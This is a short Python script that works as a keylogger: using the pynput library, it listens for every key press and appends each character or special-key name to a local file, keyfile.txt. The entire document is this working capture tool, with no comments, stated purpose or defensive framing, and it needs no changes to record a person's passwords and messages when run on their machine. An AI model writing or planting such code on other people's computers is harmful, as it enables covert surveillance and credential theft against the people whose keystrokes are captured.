from pynput import keyboard

def keypressed(key):
    with open("keyfile.txt", 'a') as logkey:
        try:
            
            if key.char is not None:
                logkey.write(key.char)
            else:
                
                logkey.write(f'[{key}]')
        except AttributeError:
            logkey.write(f'[{key}]')

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keypressed)
    listener.start()
    listener.join()  
